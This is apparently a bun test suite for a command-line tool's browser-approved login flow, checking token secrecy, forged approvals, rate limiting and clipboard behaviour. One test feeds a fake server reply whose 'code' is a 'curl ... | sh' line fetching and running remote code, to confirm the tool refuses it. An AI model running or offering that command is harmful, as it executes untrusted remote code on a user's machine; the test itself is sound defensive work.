import { afterEach, describe, expect, test } from "bun:test";
import { existsSync, readFileSync } from "node:fs";
import { join } from "node:path";

import { createConsole } from "../../../../app/src/console/console";
import { MemoryCounters } from "../../../../app/src/limits/memory-counters";
import { answered, NOW, ORIGIN } from "../../../../app/tests/api/support/install";
import { CLIENT } from "../../../../app/tests/console/support/console";
import { FREE_LIMITS, KINDS, USAGE_HOST } from "../../../../app/tests/console/support/install";
import type { Login as Email } from "../../../../core/src/auth/logins";
import { type Bench, cleanUp, jsonOf, openBench, type Ran } from "../support/harness";

/** The admin who sits at the dashboard. */
const ADA = "ada@example.com" as Email;

/** The header the test dashboard takes for Ada's login, where a provider's verified token would be. */
const AS_ADA = { "Test-Login": "ada" } as const;

/** The form of a login's secret and of a token, wherever one sits in a text. */
const CREDENTIAL = /poplin_login_[0-9a-f]{16}_[0-9a-f]{64}|poplin_[0-9a-f]{16}_[0-9a-f]{64}/g;

/** The code a terminal shows, as it prints it. */
const CODE = /[BCDFGHJKLMNPQRSTVWXZ]{4}-[BCDFGHJKLMNPQRSTVWXZ]{4}/;

/** A terminal a person sits at, with no line of progress to tell apart from the lines of the result. */
const AT_TERMINAL = { asks: true, progress: false } as const;

/** How one decision differs from the one the dashboard's client sends. */
interface SendOptions {
  /** Whether the decision goes as a form, which a page of any origin can send; it goes as JSON unless said. */
  readonly form?: boolean;

  /** Whether the decision carries the admin's login; it does unless said. */
  readonly session?: boolean;
}

/** A decision on one waiting login, as the dashboard's client sends it. */
interface Decision {
  readonly login: string;
  readonly allow: boolean;
  readonly scope?: string;
  readonly code?: string;
}

/** Whether the machine a login is run on has a terminal a person sits at, and a clipboard that takes what is copied. */
type Machine = Pick<NonNullable<Parameters<Bench["run"]>[1]>, "terminal" | "clipboard">;

/** A login that waits, as the dashboard shows it for review. */
interface Waiting {
  readonly login: { readonly id: string; readonly scope: string; readonly computer: string };
}

/** A command bench with the install's dashboard beside it, and everything either one let out. */
interface Desk {
  /** The command bench, whose install the dashboard is built over. */
  readonly bench: Bench;

  /** Everything the dashboard answered, page or data, as text. */
  readonly pages: string[];

  /** Every secret and token the API answered with. */
  readonly credentials: Set<string>;

  /** Ask the dashboard for a page or for data, with the admin's login unless said. */
  readonly get: (path: string, session?: boolean) => Promise<Response>;

  /** Send a decision on a login as the dashboard's client does. */
  readonly decide: (decision: Decision, options?: SendOptions) => Promise<Response>;

  /** Run `poplin login`, and at its first wait do what the person at the dashboard does with the address it printed. `machine` says whether a terminal and a clipboard are there; neither unless said. */
  readonly login: (line: string, atDashboard?: (address: string, ran: Ran) => Promise<"interrupted" | undefined>, machine?: Machine) => Promise<Ran>;

  /** The audit entries written after the install was opened, the newest first, as who did what. */
  readonly audit: () => Promise<unknown[]>;

  /** The stored login, `undefined` when the machine holds none. */
  readonly saved: () => { server: string; token: string } | undefined;
}

async function openDesk(): Promise<Desk> {
  const bench = await openBench();
  const { database, store, clock, api } = bench.install;
  const pages: string[] = [];
  const credentials = new Set<string>();

  const dashboard = createConsole({
    install: { database, store, now: () => clock.now, addressOf: KINDS.hostname.addresses.addressOf, publicAddressOf: KINDS.hostname.addresses.publicAddressOf, reservedNames: KINDS.hostname.addresses.reservedNames },
    version: "1.0.0",
    layout: KINDS.hostname.layout,
    admit: async (headers) => (headers.get("Test-Login") === AS_ADA["Test-Login"] ? { ok: true, actor: { scope: "admin", holder: ADA }, since: 0 } : { ok: false, refusal: "no-proof" }),
    entered: async () => undefined,
    base: "",
    client: CLIENT,
    freeLimits: FREE_LIMITS,
    usage: USAGE_HOST,
    update: { holdsKey: () => false, ready: async () => ({ ok: false, code: "no_key" }) },
    latest: { fetch: async () => new Response(null, { status: 503 }) },
    counters: new MemoryCounters(),
    visitorOf: async () => "the-admin",
  });

  // The API answers through here, so what it hands out is known to the test and to nothing else.
  bench.hook = async (request) => {
    const answer = await api.fetch(request);
    for (const [credential] of (await answer.clone().text()).matchAll(CREDENTIAL)) credentials.add(credential);

    return answer;
  };

  const get: Desk["get"] = async (path, session = true) => {
    const answer = await dashboard.fetch(new Request(new URL(path, ORIGIN), { headers: session ? AS_ADA : {} }));
    pages.push(await answer.clone().text());

    return answer;
  };

  const decide: Desk["decide"] = async (decision, options = {}) => {
    const body = options.form === true ? new URLSearchParams(Object.entries(decision).map(([key, value]) => [key, String(value)])).toString() : JSON.stringify(decision);
    const type = options.form === true ? "application/x-www-form-urlencoded" : "application/json";
    const headers = { Origin: ORIGIN, "Sec-Fetch-Site": "same-origin", "Content-Type": type, ...(options.session === false ? {} : AS_ADA) };
    const answer = await dashboard.fetch(new Request(new URL("/data/logins/decide", ORIGIN), { method: "POST", headers, body }));
    pages.push(await answer.clone().text());

    return answer;
  };

  const login: Desk["login"] = (line, atDashboard, machine = {}) => {
    let visited = false;
    bench.paused = async (ran) => {
      if (visited || atDashboard === undefined) return undefined;

      visited = true;
      const address = ran.out.map((printed) => printed.trim()).find((printed) => printed.startsWith(ORIGIN)) ?? (JSON.parse(ran.out[0] ?? "{}").verify_url as string);

      return atDashboard(address, ran);
    };

    return bench.run(line, { env: {}, ...machine });
  };

  const file = join(bench.home, "config", "login.json");

  return {
    bench,
    pages,
    credentials,
    get,
    decide,
    login,
    audit: async () => (await database.listAudit({ limit: 100 })).filter((entry) => entry.at > NOW).map((entry) => [entry.by, entry.action, entry.detail]),
    saved: () => (existsSync(file) ? JSON.parse(readFileSync(file, "utf8")) : undefined),
  };
}

/** The id of the login an address the terminal printed leads to: the address names the login and holds nothing of its code. */
function idIn(address: string): string {
  return new URL(address).pathname.split("/").at(-1) ?? "";
}

/** The code the terminal printed, which a person types or pastes on the page. */
function codeOf(ran: Ran): string {
  return CODE.exec(ran.out.join("\n"))?.[0] ?? "";
}

/** The login an address leads to, as the dashboard shows it for review. */
async function waitingAt(desk: Desk, address: string): Promise<Waiting["login"]> {
  return ((await (await desk.get(`/data/logins/${idIn(address)}`)).json()) as Waiting).login;
}

/** Allow the login at an address for all it asks, as a person may: open the address, choose what it asks for, give the code the terminal shows, press Allow. */
async function allow(desk: Desk, address: string, ran: Ran): Promise<undefined> {
  await desk.get(address);
  await desk.decide({ login: idIn(address), allow: true, scope: (await waitingAt(desk, address)).scope, code: codeOf(ran) });
}

afterEach(cleanUp);

describe("logIn", () => {
  // Drift: the login is the first thing every person and every agent does; any step that drifted between the terminal, the API, and the dashboard would leave no way to a token but by hand.
  test("a login the admin allows saves a token that works, prints the address and the code first, and tells the audit log who allowed which computer", async () => {
    const desk = await openDesk();
    let opened = 0;
    let shown: Waiting["login"] | undefined;

    const ran = await desk.login(`login --server ${ORIGIN}`, async (address, soFar) => {
      opened = (await desk.get(address)).status;
      shown = await waitingAt(desk, address);
      await desk.decide({ login: idIn(address), allow: true, scope: shown.scope, code: codeOf(soFar) });

      return undefined;
    });

    const saved = desk.saved();
    const code = codeOf(ran);
    const who = await answered(desk.bench.install.as(saved?.token ?? null).whoami.$get());

    expect([ran.code, ran.err, ran.out.slice(0, 3)]).toEqual([
      0,
      [],
      ["Approve this login in your browser:", `  ${ORIGIN}/tokens/review/${shown?.id}`, `Code: ${code}   (type it on that page; expires in 10 minutes)`],
    ]);
    expect(ran.out.slice(3).map((line) => line.split(/ {2,}/)[0])).toEqual(["Logged in. The token is stored on this machine.", "install", "role", "token", "expires"]);
    expect([ran.opened, ran.waits, desk.bench.sent]).toEqual([[`${ORIGIN}/tokens/review/${shown?.id}`], [5000], ["POST /api/logins", "POST /api/logins/token"]]);
    // Drift: the address the terminal prints and opens, or what the page is given, would hold a part of the code, and whoever is sent the address would need no terminal.
    expect([code.slice(0, 4), code.slice(-4)].filter((half) => (ran.opened[0] ?? "").includes(half) || JSON.stringify(shown).includes(half))).toEqual([]);
    expect([opened, shown]).toMatchObject([200, { scope: "admin", computer: "test-computer" }]);
    expect([saved?.server, who.status, who.body.token]).toMatchObject([ORIGIN, 200, { scope: "admin", note: "test-computer" }]);
    expect(await desk.audit()).toEqual([
      [ADA, "token_added", { token: (who.body.token as { id: string }).id, scope: "admin", note: "test-computer" }],
      [ADA, "login_allowed", { scope: "admin", computer: "test-computer" }],
    ]);
  });

  // Drift: the secret and the token are the two things that must reach the terminal alone; one echoed into a page, an audit row, a line of output, or a reported error would be read by whoever reads those.
  test("neither the secret nor the token is in any page, audit entry, printed line, or reported failure, and the token is stored as its hash alone", async () => {
    const desk = await openDesk();

    const ran = await desk.login(`login --server ${ORIGIN} --machine laptop`, (address, ran) => allow(desk, address, ran));
    await desk.get("/data/tokens");
    await desk.get("/data/activity");
    const everything = [...desk.pages, JSON.stringify(await desk.bench.install.database.listAudit({ limit: 100 })), ...ran.out, ...ran.err, ...ran.status, JSON.stringify(desk.bench.install.reported)].join("\n");
    const stored = JSON.stringify(await desk.bench.install.database.listTokens());

    expect([ran.code, desk.credentials.size, [...desk.credentials].includes(desk.saved()?.token ?? "")]).toEqual([0, 2, true]);
    expect([...desk.credentials].filter((credential) => everything.includes(credential) || stored.includes(credential))).toEqual([]);
    expect(everything.match(CREDENTIAL)).toBeNull();
    expect(desk.pages.some((page) => page.includes("laptop"))).toBe(true);
  });

  // Drift: a denied, unanswered, or stopped login must leave the machine as it was; a file written early would hold a token that never came, or drop the login that was there.
  test.each([
    ["denied on the dashboard", "The login was denied on the dashboard. Nothing was stored.", [[ADA, "login_denied", { scope: "admin", computer: "test-computer" }]]],
    ["answered by nobody for ten minutes", "The login expired before approval", []],
    ["stopped by the person", "Cancelled. Nothing changed.", []],
  ] as const)("a login %s exits 1, saves nothing, and makes no token", async (how, sentence, audit) => {
    const desk = await openDesk();

    const ran = await desk.login(`login --server ${ORIGIN}`, async (address) => {
      if (how.startsWith("denied")) await desk.decide({ login: idIn(address), allow: false });

      return how.startsWith("stopped") ? "interrupted" : undefined;
    });

    expect([ran.code, ran.err[0], desk.saved(), (await desk.bench.install.database.listTokens()).length]).toEqual([1, sentence, undefined, 3]);
    expect(await desk.audit()).toEqual(audit.map((entry) => [...entry]));
    expect(ran.waits.length).toBe(how.startsWith("answered") ? 120 : 1);
  });

  // Drift: a link an attacker sent the admin, or a page of another origin posting for them, must not let a computer in; each row is one way to press Allow that is not the admin choosing to.
  test.each([
    ["with no login behind it", { session: false }, "terminal", 401, "no_login"],
    ["as a form, which a page of any origin can send", { form: true }, "terminal", 415, "not_json"],
    ["with a code that is not the terminal's", {}, "other", 400, "not_confirmed"],
    ["with the last four letters of the terminal's code", {}, "half", 400, "not_confirmed"],
    ["with no code", {}, "none", 400, "bad_argument"],
  ] as const)("an Allow pressed %s lets no computer in: the login stays pending and runs out", async (_how, options, typed, status, refusal) => {
    const desk = await openDesk();
    let answered: Response | undefined;

    const ran = await desk.login(`login --server ${ORIGIN}`, async (address, soFar) => {
      const mine = codeOf(soFar);
      const given = { terminal: { code: mine }, half: { code: mine.slice(-4) }, other: { code: mine.startsWith("B") ? `C${mine.slice(1)}` : `B${mine.slice(1)}` }, none: {} }[typed];
      answered = await desk.decide({ login: idIn(address), allow: true, scope: "admin", ...given }, options);

      return undefined;
    });

    expect([answered?.status, ((await answered?.json()) as { code?: string } | undefined)?.code]).toEqual([status, refusal]);
    expect([ran.code, ran.err[0], desk.saved(), await desk.audit(), (await desk.bench.install.database.listTokens()).length]).toEqual([1, "The login expired before approval", undefined, [], 3]);
  });

  // Drift: the code is copied for the person at the terminal alone. Under `--json`, or with no terminal to ask on, a program's user would find their clipboard replaced.
  // A line that says "copied" on a machine with no clipboard would send a person to paste what they do not hold.
  test.each([
    ["on a terminal whose machine has a clipboard", "", { terminal: AT_TERMINAL, clipboard: true }, true, "Code copied: CODE   (paste it on that page; expires in 10 minutes)"],
    ["on a terminal whose machine has no clipboard", "", { terminal: AT_TERMINAL }, true, "Code: CODE   (type it on that page; expires in 10 minutes)"],
    ["with no terminal to ask on, on a machine with a clipboard", "", { clipboard: true }, false, "Code: CODE   (type it on that page; expires in 10 minutes)"],
    ["with --json, on a terminal whose machine has a clipboard", " --json", { terminal: AT_TERMINAL, clipboard: true }, false, undefined],
  ] as const)("a login run %s hands the clipboard the code or nothing, and says which", async (_where, flag, machine, handed, line) => {
    const desk = await openDesk();

    const ran = await desk.login(`login --server ${ORIGIN} --no-browser${flag}`, (address, soFar) => allow(desk, address, soFar), machine);
    const code = codeOf(ran);

    expect([ran.code, ran.copied, ran.out.find((printed) => printed.startsWith("Code"))]).toEqual([0, handed ? [code] : [], line?.replace("CODE", code)]);
  });

  // Drift: an agent's shell holds a publisher token so it can touch its own sites alone; a login that ignored the flag would hand every agent the whole install.
  test("--publisher saves a publisher's token, which the dashboard said it would be, and --no-browser opens none", async () => {
    const desk = await openDesk();
    let asked = "";

    const ran = await desk.login(`login --server ${ORIGIN} --publisher --no-browser`, async (address, soFar) => {
      asked = (await waitingAt(desk, address)).scope;

      return allow(desk, address, soFar);
    });
    const saved = desk.bench.install.as(desk.saved()?.token ?? null);

    expect([ran.code, ran.opened, asked]).toEqual([0, [], "publisher"]);
    expect((await answered(saved.whoami.$get())).body.token).toMatchObject({ scope: "publisher", expires: "never" });
    expect((await answered(saved.tokens.$get())).status).toBe(403);
  });

  // Drift: the dashboard's choice stands on another screen than the terminal's last lines; a login that asked for every right and got less would first say so at the next command, as a refusal.
  test("a login that asked for every right and was allowed its own sites only says so, in the dashboard's words for the two choices", async () => {
    const desk = await openDesk();

    const ran = await desk.login(`login --server ${ORIGIN} --no-browser`, async (address, soFar) => {
      await desk.get(address);
      await desk.decide({ login: idIn(address), allow: true, scope: "publisher", code: codeOf(soFar) });
    });

    expect([ran.code, ran.err, ran.out.includes("role     publisher")]).toEqual([0, ["The dashboard approved \"Publisher\". Fix: for \"Admin\", log in again and select it there"], true]);
  });

  // Drift: an agent relays the address to its user from the first line while the command still waits; a line that came late, or that was not JSON, would leave the user with nothing to open.
  test("--json prints the address and the code as one line before it waits, and who was logged in as a second, with no token in either", async () => {
    const desk = await openDesk();
    let first: Record<string, unknown> = {};

    const ran = await desk.login(`login --server ${ORIGIN} --json`, async (address, soFar) => {
      first = jsonOf(soFar);

      return allow(desk, address, soFar);
    });
    const [announced = "", result = ""] = ran.out;

    expect([ran.code, ran.out.length, JSON.parse(announced)]).toEqual([0, 2, first]);
    const id = idIn(String(first.verify_url));
    expect(id).toMatch(/^[0-9a-f]{16}$/);
    expect(first).toEqual({ verify_url: `${ORIGIN}/tokens/review/${id}`, code: expect.stringMatching(new RegExp(`^${CODE.source}$`)), expires_in: 600 });
    expect(JSON.parse(result)).toMatchObject({ server: ORIGIN, token: { scope: "admin", note: "test-computer" } });
    expect(ran.out.join("\n").match(CREDENTIAL)).toBeNull();
  });

  // Drift: the install paces a terminal by its visitor's count alone. A terminal that kept its pace through a 429 would be refused again, and one that gave up would fail a login the admin was about to allow.
  test("a terminal asked for a rest waits as long as the answer says, then goes on at its pace and still collects its token", async () => {
    const desk = await openDesk();
    const inner = desk.bench.hook;
    let questions = 0;
    desk.bench.hook = async (request) => {
      if (request.method !== "POST" || new URL(request.url).pathname !== "/api/logins/token") return inner?.(request);

      questions += 1;
      if (questions > 1) return inner?.(request);

      return Response.json({ error: { code: "too_many_requests", message: "Rate limited by the install" } }, { status: 429, headers: { "Retry-After": "90" } });
    };

    const ran = await desk.login(`login --server ${ORIGIN}`, async (address, soFar) => {
      desk.bench.paused = async () => {
        if (soFar.waits.length === 3) await allow(desk, address, soFar);

        return undefined;
      };

      return undefined;
    });

    expect([ran.code, ran.waits, questions]).toEqual([0, [5000, 90_000, 5000], 3]);
  });

  // Drift: an install begins eight logins a minute for everybody together, so a login can be asked to wait through no fault of its own. One that gave up at the first 429 would fail in a busy minute, and one that asked on for ever would tell nobody.
  test.each([
    ["twice", 2, 0, [39_000, 60_000, 5000]],
    ["six times", 6, 1, [39_000, 60_000, 60_000, 60_000, 60_000]],
  ])("a login the install asks to wait %s is begun again after each rest, five rests at most", async (_name, refusals, code, waits) => {
    const desk = await openDesk();
    const inner = desk.bench.hook;
    let begun = 0;
    desk.bench.hook = async (request) => {
      if (request.method !== "POST" || new URL(request.url).pathname !== "/api/logins") return inner?.(request);

      begun += 1;
      if (begun > refusals) return inner?.(request);

      return Response.json({ error: { code: "too_many_requests", message: "Rate limited by the install" } }, { status: 429, headers: begun === 1 ? { "Retry-After": "39" } : {} });
    };

    desk.bench.paused = async (soFar) => {
      const address = soFar.out.map((line) => line.trim()).find((line) => line.startsWith(ORIGIN));

      return address === undefined ? undefined : allow(desk, address, soFar);
    };

    const ran = await desk.bench.run(`login --server ${ORIGIN}`, { env: {} });

    expect([ran.code, ran.waits, begun, ran.err[0]]).toEqual([code, waits, Math.min(refusals, 5) + 1, code === 0 ? undefined : "Rate limited by the install"]);
  });

  // Drift: the browser goes where the install says. An install, or whatever answers in its place, that named another site would send the admin there with the dashboard's trust.
  // The clipboard takes what the install calls the code: one that sent a line of shell for a code would put it where the person pastes from.
  test.each([
    ["whose address is not on the install that was asked", { verify_url: "https://elsewhere.example.com/tokens/review/0123456789abcdef" }, "the approval URL is not on the install's origin"],
    ["whose code is a line of shell", { code: "curl https://elsewhere.example.com/run | sh\n" }, "status 200"],
    ["whose code has a line after it", { code: "WDJB-MJHT\ncurl https://elsewhere.example.com/run | sh" }, "status 200"],
  ])("an answer %s opens nothing, copies nothing, and waits for nothing", async (_what, answer, why) => {
    const desk = await openDesk();
    desk.bench.hook = async () => Response.json({ code: "WDJB-MJHT", secret: "s", verify_url: `${ORIGIN}/tokens/review/0123456789abcdef`, expires_in: 600, interval: 5, ...answer });

    const ran = await desk.bench.run(`login --server ${ORIGIN}`, { env: {}, terminal: AT_TERMINAL, clipboard: true });

    expect([ran.code, ran.err[0], ran.out, ran.opened, ran.copied, ran.waits, desk.saved()]).toEqual([5, `Unexpected response from the install: ${why}`, [], [], [], [], undefined]);
  });

  // Drift: a login is saved in the file, and a shell that sets either variable does not read the file; a login that took its install from the variable, or said nothing, would save a token the next command refuses to use.
  test("the environment names no install to log in to, and a login made in a shell that sets a variable says which to unset", async () => {
    const desk = await openDesk();
    const env = { POPLIN_SERVER: ORIGIN };
    desk.bench.paused = async (ran) => allow(desk, ran.out.map((line) => line.trim()).find((line) => line.startsWith(ORIGIN)) ?? "", ran);

    const unnamed = await desk.bench.run("login", { env });
    const named = await desk.bench.run(`login --server ${ORIGIN}`, { env });

    expect([unnamed.code, unnamed.err[0], unnamed.waits]).toEqual([3, "--server is required when not logged in", []]);
    expect([named.code, named.err, desk.saved()?.server]).toEqual([0, ["POPLIN_SERVER is set in this shell. Fix: unset it to use the stored login"], ORIGIN]);
  });

  // Drift: a second login is how a token is renewed; one that needed the address again, or that lost the stored login when it was denied, would lock a person out of an install they were in.
  test("with a login saved, login asks the same install again, and a denied one leaves the stored login as it was", async () => {
    const desk = await openDesk();
    await desk.login(`login --server ${ORIGIN}`, (address, ran) => allow(desk, address, ran));
    const before = desk.saved();

    const denied = await desk.login("login", async (address) => {
      await desk.decide({ login: idIn(address), allow: false });

      return undefined;
    });
    const kept = desk.saved();
    // One address begins two logins a minute: the third is begun in the next.
    desk.bench.install.clock.now += 60_000;
    const again = await desk.login("login", (address, ran) => allow(desk, address, ran));

    expect([denied.code, kept, again.code, desk.saved()?.server]).toEqual([1, before, 0, ORIGIN]);
    expect([before?.token === undefined, desk.saved()?.token === before?.token]).toEqual([false, false]);
  });

  // Drift: the first Ctrl-C no longer ends the process by itself; a login that heard a stop during a wait alone would sit out a call that never answers before it ended.
  test("a login the person stops while a call is on its way ends as stopped, with nothing saved", async () => {
    const desk = await openDesk();
    desk.bench.hook = () => {
      setTimeout(desk.bench.stop, 5);

      return new Promise<Response>(() => undefined);
    };

    const stopped = await desk.bench.run(`login --server ${ORIGIN}`, { env: {} });

    expect([stopped.code, stopped.out, stopped.err, desk.saved()]).toEqual([1, [], ["Cancelled"], undefined]);
  });
});
